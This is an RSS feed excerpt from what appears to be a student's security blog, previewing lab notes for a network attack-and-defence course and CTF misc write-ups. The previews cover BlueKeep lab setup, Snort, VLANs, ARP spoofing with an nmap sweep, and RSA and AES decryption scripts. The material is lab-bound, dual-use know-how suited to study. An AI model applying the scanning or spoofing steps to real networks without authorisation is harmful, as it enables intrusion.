&lt;p>&lt;img src="https://hackmd.io/_uploads/B1Ti653GA.png" alt="圖片" />&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 12</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-12/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-12/</guid><description>&lt;h1 id="ad-of-network-security---lab-12">
 A&amp;amp;D of Network Security - Lab 12
 &lt;a class="anchor" href="#ad-of-network-security---lab-12">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="video">
 Video
 &lt;a class="anchor" href="#video">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/c6cc49a9-e1f9-4a9e-a7dc-70c4f79c98b1/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1684429335&amp;amp;Signature=UQaLvueX0U%2Bvs65WhFgrks9vg%2Fc%3D">NTU PADNS Lecture 12&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-170">What is _mbscmp?&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">int _mbscmp(
 const unsigned char *string1,
 const unsigned char *string2
);
&lt;/code>&lt;/pre>&lt;p>Return Value&lt;/p>
&lt;blockquote>
&lt;p>&amp;lt;0 	string1 is less than string2
=0 	string1 is identical to string2
&amp;gt;0 	string1 is greater than string2&lt;/p>&lt;/blockquote>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;h3 id="static---ida-pro">
 Static - IDA Pro
 &lt;a class="anchor" href="#static---ida-pro">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler Main Source Code&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 13</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-13/</guid><description>&lt;h1 id="ad-of-network-security---lab-13">
 A&amp;amp;D of Network Security - Lab 13
 &lt;a class="anchor" href="#ad-of-network-security---lab-13">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="metasploit-with-bluekeep-vulnerability-cve-2019-0708">
 Metasploit with Bluekeep Vulnerability (CVE-2019-0708)
 &lt;a class="anchor" href="#metasploit-with-bluekeep-vulnerability-cve-2019-0708">#&lt;/a>
&lt;/h2>
&lt;h3 id="setting-up-environment">
 Setting up environment
 &lt;a class="anchor" href="#setting-up-environment">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Open Windows 7 and Kali-Linux with &lt;code>localhost only&lt;/code> mode
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/Skg3sJ93Hh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByyTJqnHh.png" alt="" />
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Then we can note that the IP of these two machines are different:
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/H1gOg5hSn.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H1VSlcnB3.png" alt="" />
:::
Now, we know &lt;code>Win7&lt;/code>&amp;rsquo;s IP: &lt;code>192.168.56.101&lt;/code>
Kali-Linux&amp;rsquo;s IP: &lt;code>192.168.56.102&lt;/code>&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 14</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-14/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-14/</guid><description>&lt;h1 id="ad-of-network-security---lab-14">
 A&amp;amp;D of Network Security - Lab 14
 &lt;a class="anchor" href="#ad-of-network-security---lab-14">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="video">
 Video
 &lt;a class="anchor" href="#video">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/f4f0b276-7211-448a-812b-89b3d194ccde/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1685444669&amp;amp;Signature=XXKzQ0FHD31E%2FdKWhlcyX%2BcLQXg%3D">Class Description&lt;/a>
&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/b494d4d3-0d67-4672-95ab-37a8c35b70b3/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1685432006&amp;amp;Signature=sJvf4b%2BWXnkZY3dCFmX4vHCcyy0%3D">Lab Implementation&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>snort Rule
:::spoiler Rule Screenshot
&lt;ul>
&lt;li>Format
&lt;img src="https://hackmd.io/_uploads/S1pKEV7Ln.png" alt="" />&lt;/li>
&lt;li>Action
&lt;img src="https://hackmd.io/_uploads/HygsNEXI2.png" alt="" />&lt;/li>
&lt;li>Option
&lt;img src="https://hackmd.io/_uploads/By83VNQUh.png" alt="" />&lt;/li>
&lt;li>Option - Payload
&lt;img src="https://hackmd.io/_uploads/rJ6p44QI2.png" alt="" />
:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab-1-packet-sniffer-mode-show出-sniff-icmp封包的結果">
 Lab 1: Packet sniffer Mode show出 sniff ICMP封包的結果
 &lt;a class="anchor" href="#lab-1-packet-sniffer-mode-show%e5%87%ba-sniff-icmp%e5%b0%81%e5%8c%85%e7%9a%84%e7%b5%90%e6%9e%9c">#&lt;/a>
&lt;/h3>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo snort -vd -i eth0 -q
&lt;/code>&lt;/pre>&lt;p>:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/BJVrHN78h.png" alt="" />
:::&lt;/p>
&lt;hr>
&lt;h3 id="lab-2-attacker-ssh爆破攻擊利用-snort偵測攻擊行為是否發生show出偵測結果-並說明snort-rule">
 Lab 2: Attacker SSH爆破攻擊，利用 Snort偵測攻擊行為是否發生，show出偵測結果 ，並說明snort rule
 &lt;a class="anchor" href="#lab-2-attacker-ssh%e7%88%86%e7%a0%b4%e6%94%bb%e6%93%8a%e5%88%a9%e7%94%a8-snort%e5%81%b5%e6%b8%ac%e6%94%bb%e6%93%8a%e8%a1%8c%e7%82%ba%e6%98%af%e5%90%a6%e7%99%bc%e7%94%9fshow%e5%87%ba%e5%81%b5%e6%b8%ac%e7%b5%90%e6%9e%9c-%e4%b8%a6%e8%aa%aa%e6%98%8esnort-rule">#&lt;/a>
&lt;/h3>
&lt;h4 id="threat-model">
 Threat Model
 &lt;a class="anchor" href="#threat-model">#&lt;/a>
&lt;/h4>
&lt;p>&lt;img src="https://hackmd.io/_uploads/SkDltNQU3.png" alt="" />&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-2/</guid><description>&lt;h1 id="ad-of-network-security---lab-2">
 A&amp;amp;D of Network Security - Lab 2
 &lt;a class="anchor" href="#ad-of-network-security---lab-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="lab-cheat-sheetcisco-packet-tracer">
 Lab Cheat Sheet(Cisco Packet Tracer)
 &lt;a class="anchor" href="#lab-cheat-sheetcisco-packet-tracer">#&lt;/a>
&lt;/h2>
&lt;h3 id="setting-vlan">
 Setting VLAN
 &lt;a class="anchor" href="#setting-vlan">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler Switch&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">Switch&amp;gt;enable
Switch#configure 
Configuring from terminal, memory, or network [terminal]? 
Enter configuration commands, one per line. End with CNTL/Z.
Switch(config)#vlan 10
Switch(config-vlan)#name green
Switch(config-vlan)#vlan 20
Switch(config-vlan)#name yellow
Switch(config-vlan)#
Switch#
%SYS-5-CONFIG_I: Configured from console by console

Switch#show vlan

VLAN Name Status Ports
---- -------------------------------- --------- -------------------------------
1 default active Fa0/5, Fa0/6, Fa0/7, Fa0/8
 Fa0/9, Fa0/10, Fa0/11, Fa0/12
 Fa0/13, Fa0/14, Fa0/15, Fa0/16
 Fa0/17, Fa0/18, Fa0/19, Fa0/20
 Fa0/21, Fa0/22, Fa0/23, Fa0/24
 Gig0/1, Gig0/2
10 green active
20 yellow active
...
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler Switch相對應的Interface&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-3/</guid><description>&lt;h1 id="ad-of-network-security---lab-3">
 A&amp;amp;D of Network Security - Lab 3
 &lt;a class="anchor" href="#ad-of-network-security---lab-3">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Network setting type in virtual box
&lt;img src="https://i.imgur.com/g2J83Xg.png" alt="" />&lt;/p>
&lt;h2 id="ping-two-machine-in-internal-mode">
 Ping two machine in internal mode
 &lt;a class="anchor" href="#ping-two-machine-in-internal-mode">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Detailed Process&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Clone another VM
&lt;img src="https://i.imgur.com/vsI7lWa.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Setting Network Configuration
&lt;img src="https://i.imgur.com/OqZ9Owm.png" alt="" />
Setting 2 VMs&amp;rsquo; network config as above.
&lt;strong>Note that&lt;/strong>, must check MAC address is different, promiscuous mode is &lt;code>Allow All&lt;/code> and the adapter is the same.&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 4(ARP &amp; DNS SPOOFING)</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/</guid><description>&lt;h1 id="ad-of-network-security---lab-4arp--dns-spoofing">
 A&amp;amp;D of Network Security - Lab 4(ARP &amp;amp; DNS SPOOFING)
 &lt;a class="anchor" href="#ad-of-network-security---lab-4arp--dns-spoofing">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ha4w30V2cLM?si=eK2wwkqROck5n3SY&amp;amp;t=4497">ARP Spoofing at &lt;code>1:15:00&lt;/code>&lt;/a>&lt;/p>
&lt;h2 id="arp-spoofing">
 ARP SPOOFING
 &lt;a class="anchor" href="#arp-spoofing">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Setting 2 VMs&amp;rsquo; network interface as Bridged adapter
:::danger
You supposed to use your own network instead of public network
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Checking IP
&lt;img src="https://i.imgur.com/V1CTmtr.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/i6RUqmM.png" alt="" />
And check the victim gateway by &lt;code>nmap&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo nmap -sP 192.168.43.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 10:46 EDT
Nmap scan report for DESKTOP-D0UCTM3 (192.168.43.56)
Host is up (0.00020s latency).
MAC Address: 68:54:5A:DC:03:57 (Intel Corporate)
Nmap scan report for 192.168.43.66
Host is up (0.010s latency).
MAC Address: D4:38:9C:87:2F:C6 (Sony)
Nmap scan report for kali (192.168.43.222)
Host is up (0.00040s latency).
MAC Address: 08:00:27:B1:9D:67 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.43.78
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.13 seconds
&lt;/code>&lt;/pre>&lt;p>:::info
Victim VM $\to$ &lt;code>192.168.43.222&lt;/code> / MAC $\to$ &lt;code>08:00:27:F7:12:7A&lt;/code>
Attacker VM $\to$ &lt;code>192.168.43.78&lt;/code> / MAC $\to$ &lt;code>08:00:27:B1:9D:67&lt;/code>
Default Gateway $\to$ &lt;code>192.168.43.66&lt;/code>
:::&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 7</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-7/</guid><description>&lt;h1 id="ad-of-network-security---lab-7">
 A&amp;amp;D of Network Security - Lab 7
 &lt;a class="anchor" href="#ad-of-network-security---lab-7">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">What is foremost and How to use it?&lt;/a>&lt;/p>
&lt;h2 id="rsa-ctf">
 RSA CTF
 &lt;a class="anchor" href="#rsa-ctf">#&lt;/a>
&lt;/h2>
&lt;h3 id="exercise---rsa">
 Exercise - RSA
 &lt;a class="anchor" href="#exercise---rsa">#&lt;/a>
&lt;/h3>
&lt;p>Given&lt;/p>
&lt;pre tabindex="0">&lt;code>p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e = 65537
c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
&lt;/code>&lt;/pre>&lt;p>Then I can use decrypt function to fetch plaintext.
Flag(hex): &lt;code>12058e43d9e0c22559c19774&lt;/code>
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long

p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e = 65537
c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034

n = p * q
phi = (q-1)*(p-1)
d = inverse(e, phi)
print(long_to_bytes(pow(c,d,n)).hex())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>A&amp;D of Network Security Note</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security-note/</guid><description>&lt;h1 id="ad-of-network-security-note">
 A&amp;amp;D of Network Security Note
 &lt;a class="anchor" href="#ad-of-network-security-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="http://www.ess.nthu.edu.tw/p/16-1351-74716.php?Lang=zh-tw">IP / 遮罩 / 閘道 三者的關係&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>用日常生活中的例子來比喻，IP 就好比在社區中的門牌地址，如果是要找同社區(一樣遮罩範圍的)，就只要透過社區廣播喊一聲。如果找不到人，表示在社區外，就要出社區大門(閘道)去外面問&lt;/p>
&lt;p>所以遮罩設定錯誤，代表硬把兩個不同社區的給劃在一起，但是實際上遞送封包就會找不到 (明明住光復國宅結果你跟郵差說光復國宅跟孟竹國宅都在一區)&lt;/p>
&lt;p>閘道設定錯誤則是連大門都搞錯了，這樣蓮社區都出不去，自然網路也無法連線
:::&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://blog.downager.com/2013/07/03/%E7%B6%B2%E8%B7%AF-%E6%B7%BA%E8%AB%87-ARP-Address-Resolution-Protocol-%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86/">[網路] 淺談 ARP (Address Resolution Protocol) 運作原理&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>在乙太網路上，資料的傳遞必須要有實體位址 (MAC Address)，Layer 2 設備會驗證 Frame 的實體位址，不是找它的一律捨棄，但設備一開機總不可能就有所有設備的實體位址吧？所以就需要 ARP 協定來協助取得各個設備的實體位址&lt;/p>
&lt;p>ARP 是利用乙太網路的廣播功能所設計出來的位址解析協定，它的主要特性是它的位址對應關係是動態的，以查詢的方式來獲得 I P位址 (IP Address) 和實體位址 (MAC Address / Physical Address) 的對應關係。&lt;/p>
&lt;p>只要是 Layer 3 的設備都一定會有 ARP Cache，並且會在 ARP 快取內建立 ARP 表格 (ARP Table) 用來記錄 IP 位址和實體位址的對應關係。這個 Table 會依據自身的存活時間遞減而消失，以確保資料的正確性。
&lt;img src="https://i.imgur.com/Vg2RZHd.png" alt="" />&lt;/p></description></item><item><title>Adworld - 3-1</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---3-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---3-1/</guid><description>&lt;h1 id="adworld---3-1">
 Adworld - 3-1
 &lt;a class="anchor" href="#adworld---3-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題很簡單，和之前幾題有點像&lt;/p>
&lt;ol>
&lt;li>用file看一下給的檔案是一個&lt;code>.rar&lt;/code>壓縮檔，改個副檔名後解壓縮出現另外一個檔案&lt;/li>
&lt;li>再用file看一下是一個pcapng檔案，用wireshark分析&lt;/li>
&lt;li>用一些基本的技巧(Follow TCP Stream/Extract Object&amp;hellip;)看tcp stream，會發現一個bash的command紀錄，有一個python enc/dec flow，和一串base64的string，除此之外還可以用extract object把一些file dump下來，發現是另外一個加密的flag.rar檔案，我們的任務就是要從這個pcapng檔案中把加密的密碼找出來
&lt;img src="https://hackmd.io/_uploads/H1iy1vf5h.png" alt="" />&lt;/li>
&lt;li>用python腳本解密base64 string，會輸出&lt;code>b'passwd={No_One_Can_Decrypt_Me}\x00\x00'&lt;/code>&lt;/li>
&lt;li>解密壓縮檔flag就出來了&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Write Byte Data&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64decode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./basezip.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1 &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./cipher.zip&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1&lt;span style="color:#f92672">.&lt;/span>write(b64decode(f))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(b64decode(f)&lt;span style="color:#f92672">.&lt;/span>hex())&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;cp437&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Decrypt Part&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IV &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;QWERTYUIOPASDFGH&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>str1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(encrypted):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(IV, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, IV)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> aes&lt;span style="color:#f92672">.&lt;/span>decrypt(encrypted)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(message):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> length &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> count &lt;span style="color:#f92672">=&lt;/span> len(message)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding &lt;span style="color:#f92672">=&lt;/span> length &lt;span style="color:#f92672">-&lt;/span> (count &lt;span style="color:#f92672">%&lt;/span> length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> message &lt;span style="color:#f92672">=&lt;/span> message &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> padding
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(IV, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, IV)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> aes&lt;span style="color:#f92672">.&lt;/span>encrypt(message)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;this is a test&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>example &lt;span style="color:#f92672">=&lt;/span> decrypt(base64&lt;span style="color:#f92672">.&lt;/span>b64decode(str1))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(example)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/yoyoko_chan/article/details/117660494">【攻防世界AD】Misc进阶区：3-1&lt;/a>&lt;/p></description></item><item><title>Adworld - miao~</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---miao~/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---miao~/</guid><description>&lt;h1 id="adworld---miao">
 Adworld - miao~
 &lt;a class="anchor" href="#adworld---miao">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這題也是看了別人的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>和官解&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>用foremost搜索或救援檔案(神奇的解法，一開始完全想不到)&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ foremost -v miao\~.jpg
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Sat Jul 15 15:21:29 2023
Invocation: foremost -v miao~.jpg
Output directory: /home/sbk6401/CTF/Adworld/Misc/miao~/output
Configuration file: /etc/foremost.conf
Processing: miao~.jpg
